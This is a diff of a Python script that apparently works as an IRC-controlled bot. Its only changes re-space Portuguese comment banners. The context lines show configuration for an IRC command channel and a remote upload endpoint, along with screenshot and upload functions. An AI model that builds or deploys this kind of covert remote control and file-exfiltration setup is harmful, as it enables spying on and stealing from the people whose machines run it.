@@ -15,7 +15,7 @@ import time, datetime# For function screenshot():
 
 
 # ----------------------------------------------------------#
-#				C O N F I G U R A C O E S					#
+#                 C O N F I G U R A C O E S                 #
 # ----------------------------------------------------------#
 
 ircServer= "chat.freenode.net"	# Address Server Irc
@@ -28,7 +28,7 @@ urlUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"		# URL th
 urlStrip = urlUpload.strip('http:upload.php')		# Variable that receives the URL to display uploaded files
 
 # ----------------------------------------------------------#
-#		  F U N C O E S   O P E R A C I O N A I S			#
+#          F U N C O E S   O P E R A C I O N A I S          #
 # ----------------------------------------------------------#
 
 def conn():
@@ -163,7 +163,7 @@ def upload():
 		EnviaMsg(ircChanne, "[+] Apenas o vazio da existencia: O arquivo nao existe [+]" + "[ " + fileUp + " ]")
 
 # ----------------------------------------------------------#
-#			F U N C O E S   A U X I L I A R E S				#
+#            F U N C O E S   A U X I L I A R E S            #
 # ----------------------------------------------------------#
 
 def ping():
@@ -183,7 +183,7 @@ def quitIrc(chan):
 
 
 # ----------------------------------------------------------#
-#				F U N C A O   P R I N C I P A L				#
+#              F U N C A O   P R I N C I P A L              #
 # ----------------------------------------------------------#
 
 def main():
